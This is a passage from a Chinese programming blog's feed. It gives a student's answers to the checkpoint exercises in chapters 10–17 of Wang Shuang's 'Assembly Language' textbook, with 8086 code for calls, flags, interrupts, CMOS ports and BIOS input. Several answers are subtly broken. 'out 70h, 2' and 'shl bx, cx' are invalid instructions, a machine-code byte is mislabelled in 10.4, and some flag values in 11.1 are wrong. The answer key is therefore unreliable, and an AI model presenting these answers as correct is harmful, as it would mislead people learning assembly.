<td style="text-align:center">add ax,ax</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">pop bx</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">add ax,bx</td>
</tr>
</tbody>
</table>
<p>ax中的数值为1010H，注意执行完call far ptr s后，IP先变为8，然后将CS、IP的值分别为1000和8依此压栈，最后再跳转至s继续执行。</p>
<h3 id="检测点-10-4"><a href="#检测点-10-4" class="headerlink" title="检测点 10.4"></a>检测点 10.4</h3><p>下面的程序执行后，ax中的数值为多少？</p>
<table>
<thead>
<tr>
<th style="text-align:center">内存地址</th>
<th style="text-align:center">机器码</th>
<th style="text-align:center">汇编指令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1000:0</td>
<td style="text-align:center">b8 06 00</td>
<td style="text-align:center">mov ax,6</td>
</tr>
<tr>
<td style="text-align:center">1000:3</td>
<td style="text-align:center">ff d0</td>
<td style="text-align:center">call ax</td>
</tr>
<tr>
<td style="text-align:center">1000:5</td>
<td style="text-align:center">40</td>
<td style="text-align:center">inc ax</td>
</tr>
<tr>
<td style="text-align:center">1000:6</td>
<td style="text-align:center">58</td>
<td style="text-align:center">mov bp,sp</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">add ax,[bp]</td>
</tr>
</tbody>
</table>
<p>ax中的数值为0BH，分析方法类似检测点10.2</p>
<h3 id="检测点-10-5"><a href="#检测点-10-5" class="headerlink" title="检测点 10.5"></a>检测点 10.5</h3><ol>
<li><p>下面的程序执行后，ax中的数值为多少？</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">stack <span class="meta">segment</span></div><div class="line">	<span class="built_in">dw</span> <span class="number">8</span> dup (<span class="number">0</span>)</div><div class="line">stack ends</div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>,stack</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">16</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">0</span></div><div class="line">	<span class="keyword">call</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0eh</span>]</div><div class="line">	<span class="keyword">inc</span> <span class="built_in">ax</span></div><div class="line">	<span class="keyword">inc</span> <span class="built_in">ax</span></div><div class="line">	<span class="keyword">inc</span> <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></div><div class="line">	<span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
<p> ax中的数值为3，注意ds与ss中存放的段地址相同，在执行了call word ptr ds:[0EH]之后，程序会先将下一条指令inc ax的偏移量压栈，然后跳转到栈顶所指向的指令的位置，即跳转至第一条inc ax的位置，故最后ax的值为3。<br> 注意：在使用Debug单步跟踪的时候，由于t命令所导致的中断，而影响了栈中的值。</p>
</li>
<li><p>下面的程序执行后，ax和bx中的数值为多少？</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</div><div class="line">data <span class="meta">segment</span></div><div class="line">	<span class="built_in">dw</span> <span class="number">8</span> dup (<span class="number">0</span>)</div><div class="line">data ends</div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>,data</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">16</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="number">0</span>],offset s</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>:[<span class="number">2</span>],<span class="built_in">cs</span></div><div class="line">	<span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="number">0</span>]</div><div class="line">	<span class="keyword">nop</span></div><div class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>,offset s</div><div class="line">	<span class="keyword">sub</span> <span class="built_in">ax</span>,<span class="built_in">ss</span>:[<span class="number">0ch</span>]     </div><div class="line">   	<span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="built_in">cs</span></div><div class="line">	<span class="keyword">sub</span> <span class="built_in">bx</span>,<span class="built_in">ss</span>:[<span class="number">0eh</span>]</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></div><div class="line">	<span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
<p> ax中的数值为1，bx中的数值为0，注意到程序的一开始将a的偏移量和cs放入ss:[0]和ss:[2]中，然后调用call指令，将CS和IP(nop指令的偏移量)依此压栈后跳转到s处继续执行，ax最终为s的偏移量减去nop指令所在位置的偏移量，为1，bx最终为cs的段地址相减，为0。</p>
</li>
</ol>
<h2 id="第十一章-标志寄存器"><a href="#第十一章-标志寄存器" class="headerlink" title="第十一章 标志寄存器"></a>第十一章 标志寄存器</h2><h3 id="检测点-11-1"><a href="#检测点-11-1" class="headerlink" title="检测点 11.1"></a>检测点 11.1</h3><p>写出下面每条指令执行后，ZF、PF、SF等标志位的值</p>
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">ZF</th>
<th style="text-align:center">PF</th>
<th style="text-align:center">SF</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">sub al, al</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov al, 1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">push ax</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">pop bx</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">add al, bl</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">add bl, 10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mul al</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
</tbody>
</table>
<h3 id="检测点-11-2"><a href="#检测点-11-2" class="headerlink" title="检测点 11.2"></a>检测点 11.2</h3><p>写出下面每条指令执行后，ZF、PF、SF、CF、OF等标志位的值</p>
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">CF</th>
<th style="text-align:center">OF</th>
<th style="text-align:center">SF</th>
<th style="text-align:center">ZF</th>
<th style="text-align:center">PF</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">sub al, al</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">mov al, 10H</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">add al, 90H</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">mov al, 80H</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">add al, 80H</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">mov al, 0FCH</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">add al, 05H</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov al, 7DH</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">add al, 0BH</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
</tbody>
</table>
<h3 id="检测点-11-3"><a href="#检测点-11-3" class="headerlink" title="检测点 11.3"></a>检测点 11.3</h3><ol>
<li><p>补全下面的程序，统计F000:0处32个字节中，大小在[32,128]的数据的个数。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0f000h</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">32</span></div><div class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span>]</div><div class="line">	<span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">32</span></div><div class="line">	__________</div><div class="line">	<span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">128</span></div><div class="line">	__________</div><div class="line">	<span class="keyword">inc</span> <span class="built_in">dx</span></div><div class="line"><span class="symbol">s0:</span>	<span class="keyword">inc</span> <span class="built_in">bx</span></div><div class="line">	<span class="keyword">loop</span> s</div></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">jb</span> s0</div><div class="line"><span class="keyword">ja</span> s0</div></pre></td></tr></table></figure>
</li>
<li><p>补全下面的程序，统计F000:0处32个字节中，大小在(32,128)的数据的个数。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0f000h</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">32</span></div><div class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span>]</div><div class="line">	<span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">32</span></div><div class="line">	__________</div><div class="line">	<span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">128</span></div><div class="line">	__________</div><div class="line">	<span class="keyword">inc</span> <span class="built_in">dx</span></div><div class="line"><span class="symbol">s0:</span>	<span class="keyword">inc</span> <span class="built_in">bx</span></div><div class="line">	<span class="keyword">loop</span> s</div></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">jna</span> s0</div><div class="line"><span class="keyword">jnb</span> s0</div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="检测点-11-4"><a href="#检测点-11-4" class="headerlink" title="检测点 11.4"></a>检测点 11.4</h3><p>下面的程序执行后：(ax)=?</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">popf</span> <span class="comment">;将PSW置0(本章所学习的标志位都为0)</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0fff0h</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="number">0010h</span> <span class="comment">;修改相关标志位</span></div><div class="line"><span class="keyword">pushf</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span> <span class="comment">;(将PSW保存至ax)</span></div><div class="line"><span class="keyword">and</span> <span class="built_in">al</span>, <span class="number">11000101B</span></div><div class="line"><span class="keyword">and</span> <span class="number">ah</span>, <span class="number">00001000B</span> <span class="comment">;只考虑CF,PF,ZF,SF,OF五个标志位</span></div></pre></td></tr></table></figure>
<p>答案：<br>(ax)=45H</p>
<h2 id="第十二章-内中断"><a href="#第十二章-内中断" class="headerlink" title="第十二章 内中断"></a>第十二章 内中断</h2><h3 id="检测点-12-1"><a href="#检测点-12-1" class="headerlink" title="检测点 12.1"></a>检测点 12.1</h3><ol>
<li><p>用Debug查看内存，情况如下：<br> 0000:0000 68 10 A7 00 8B 01 70 00-16 00 9D 03 8B 01 70 00<br> 则3号中断源对应的中断处理程序的入口地址为：<strong><strong><em>__</em></strong></strong><br> 答案：<br> 0070:018B<br> 注意高地址存放段地址，低地址存放偏移地址</p>
</li>
<li><p>存储N号中断源对应的中断处理程序入口的偏移地址的内存单元的地址为：<strong><strong><br> 存储N号中断源对应的中断处理程序入口的段地址的内存单元的地址为：</strong></strong><br> 答案：4N，4N+2</p>
</li>
</ol>
<h2 id="第十三章-int指令"><a href="#第十三章-int指令" class="headerlink" title="第十三章 int指令"></a>第十三章 int指令</h2><h3 id="检测点-13-1"><a href="#检测点-13-1" class="headerlink" title="检测点 13.1"></a>检测点 13.1</h3><ol>
<li><p>在上面的内容中，我们用7ch中断例程实现loop的功能，则上面的7ch中断例程所能进行的最大转移位移为多少？<br> 答案：65535</p>
</li>
<li><p>用7ch中断例程完成jmp near ptr s指令的功能，用bx向中断例程传送转移位移。<br> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">jnp:</span>	<span class="keyword">push</span> <span class="built_in">bp</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bp</span>, <span class="built_in">sp</span></div><div class="line">	<span class="keyword">add</span> [<span class="built_in">bp</span>+<span class="number">2</span>], <span class="built_in">bx</span></div><div class="line">	<span class="keyword">pop</span> <span class="built_in">bp</span></div><div class="line">	<span class="keyword">iret</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="检测点-13-2"><a href="#检测点-13-2" class="headerlink" title="检测点 13.2"></a>检测点 13.2</h3><p>判断下面说法的正误：</p>
<ol>
<li>我们可以编程改变FFFF:0处的指令，使得CPU不去执行BIOS中的硬件系统检测和初始化程序。<br> 错误：FFFF:0处的内容无法修改</li>
<li>int 19h中断例程，可以由DOS提供。<br> 错误：此时DOS还未被引导</li>
</ol>
<h2 id="第十四章-端口"><a href="#第十四章-端口" class="headerlink" title="第十四章 端口"></a>第十四章 端口</h2><h3 id="检测点-14-1"><a href="#检测点-14-1" class="headerlink" title="检测点 14.1"></a>检测点 14.1</h3><ol>
<li>编程，读取CMOS RAM的2号单元的内容。 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></div><div class="line"><span class="keyword">out</span> <span class="number">70h</span>, <span class="number">2</span></div><div class="line"><span class="keyword">in</span> <span class="built_in">al</span>, <span class="number">71h</span></div></pre></td></tr></table></figure></li>
<li>编程，向CMOS RAM的2号单元写入0。 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></div><div class="line"><span class="keyword">out</span> <span class="number">70h</span>, <span class="number">2</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0</span></div><div class="line"><span class="keyword">out</span> <span class="number">71h</span>, <span class="built_in">al</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="检测点-14-2"><a href="#检测点-14-2" class="headerlink" title="检测点 14.2"></a>检测点 14.2</h3><p>编程，用加法和位移指令计算(ax)=(ax)*10。<br>提示，(ax)*10=(ax)*2+(ax)*8。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">shl</span> <span class="built_in">ax</span>, <span class="number">1</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">3</span></div><div class="line"><span class="keyword">shl</span> <span class="built_in">bx</span>, <span class="built_in">cx</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">bx</span></div></pre></td></tr></table></figure>
<h2 id="第十五章-外中断"><a href="#第十五章-外中断" class="headerlink" title="第十五章 外中断"></a>第十五章 外中断</h2><h3 id="检测点-15-1"><a href="#检测点-15-1" class="headerlink" title="检测点 15.1"></a>检测点 15.1</h3><ol>
<li><p>仔细分析一下上面的int 9中断例程，看看是否可以精简一下？<br> 其实在我们的int 9中断例程中，模拟int指令调用原int 9中断例程的程序段是可以精简的，因为在进入中断例程后，IF和TF都已经置0，没有必要再进行设置了。对于程序段：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pushf</span></div><div class="line"><span class="keyword">pushf</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">and</span> <span class="number">ah</span>, <span class="number">11111100B</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">popf</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div></pre></td></tr></table></figure>
<p> 可以精简为：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pushf</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div></pre></td></tr></table></figure>
<p> 两条指令。</p>
</li>
<li><p>仔细分析上面程序中的主程序，看看有什么潜在的问题？<br> 在主程序中，如果在执行设置int 9中断例程的段地址和偏移地址的指令之间发生了键盘中断，则CPU将转去一个错误的地址执行，将发生错误。<br> 找出这样的程序段，改写它们，排除潜在的问题。<br> 提示，注意sti和cli指令的用法。<br> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cli</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">9</span>*<span class="number">4</span>],offset int9</div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">9</span>*<span class="number">4</span>+<span class="number">2</span>],<span class="built_in">cs</span></div><div class="line"><span class="keyword">sti</span></div></pre></td></tr></table></figure>
<p> 以及：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cli</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span>:[<span class="number">9</span>*<span class="number">4</span>]</div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span>:[<span class="number">9</span>*<span class="number">4</span>+<span class="number">2</span>]</div><div class="line"><span class="keyword">sti</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="第十六章-直接定址表"><a href="#第十六章-直接定址表" class="headerlink" title="第十六章 直接定址表"></a>第十六章 直接定址表</h2><h3 id="检测点-16-1"><a href="#检测点-16-1" class="headerlink" title="检测点 16.1"></a>检测点 16.1</h3><p>下面的程序将code段中a处的8个数据累加，结果存储到b处的双字中，补全程序。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">code <span class="meta">segment</span></div><div class="line">	a <span class="built_in">dw</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></div><div class="line">	b <span class="built_in">dd</span> <span class="number">0</span></div><div class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></div><div class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, ____</div><div class="line">	<span class="keyword">add</span> ____, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">adc</span> ____, <span class="number">0</span></div><div class="line">	<span class="keyword">add</span> <span class="built_in">si</span>, ____</div><div class="line">	<span class="keyword">loop</span> s</div><div class="line"></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line">	<span class="keyword">int</span> <span class="number">21h</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a[<span class="built_in">si</span>]</div><div class="line"><span class="built_in">word</span> <span class="built_in">ptr</span> b[<span class="number">0</span>]</div><div class="line"><span class="built_in">word</span> <span class="built_in">ptr</span> b[<span class="number">2</span>]</div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure><br>注意word ptr的使用</p>
<h3 id="检测点-16-2"><a href="#检测点-16-2" class="headerlink" title="检测点 16.2"></a>检测点 16.2</h3><p>下面的程序将data段中a处的8个数据累加，结果存储到b处的字中，补全程序。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">es</span>:data</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line">a	<span class="built_in">db</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></div><div class="line">b	<span class="built_in">dw</span> <span class="number">0</span></div><div class="line">data ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>	__________</div><div class="line">	__________</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></div><div class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">al</span>, a[<span class="built_in">si</span>]</div><div class="line">	<span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">add</span> b, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line">	<span class="keyword">loop</span> s</div><div class="line"></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line">	<span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div></pre></td></tr></table></figure></p>
<h2 id="第十七章-使用BIOS进行键盘输入和磁盘读写"><a href="#第十七章-使用BIOS进行键盘输入和磁盘读写" class="headerlink" title="第十七章 使用BIOS进行键盘输入和磁盘读写"></a>第十七章 使用BIOS进行键盘输入和磁盘读写</h2><h3 id="检测点-17-1"><a href="#检测点-17-1" class="headerlink" title="检测点 17.1"></a>检测点 17.1</h3><p>“在int 16h中断例程中，一定有设置IF=1的指令”，这种说法对吗？</p>
<p>正确，int 16h中断例程在键盘缓冲区中没有数据时，会等待直到键盘缓冲区中有数据为止，因此，int 16h中需要处理int 9h中断，所以一定有设置IF=1的指令。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第一部分，包括了书上所有的检测点答案&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;第一章-基础知识&quot;&gt;&lt;a href=&quot;#第一章-基础知识&quot; class=&quot;headerl
    
    </summary>
    
      <category term="汇编" scheme="http://blog.codedragon.tech/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="答案" scheme="http://blog.codedragon.tech/tags/%E7%AD%94%E6%A1%88/"/>
    
      <category term="汇编" scheme="http://blog.codedragon.tech/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>寒假总结</title>
    <link href="http://blog.codedragon.tech/2017/02/12/%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.codedragon.tech/2017/02/12/寒假总结/</id>
    <published>2017-02-12T10:21:42.000Z</published>
    <updated>2017-03-05T07:33:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>颓废的大二上之后感觉良好的一个寒假，可能是我自上学以来效率最高的一个寒假了。</p>
</blockquote>
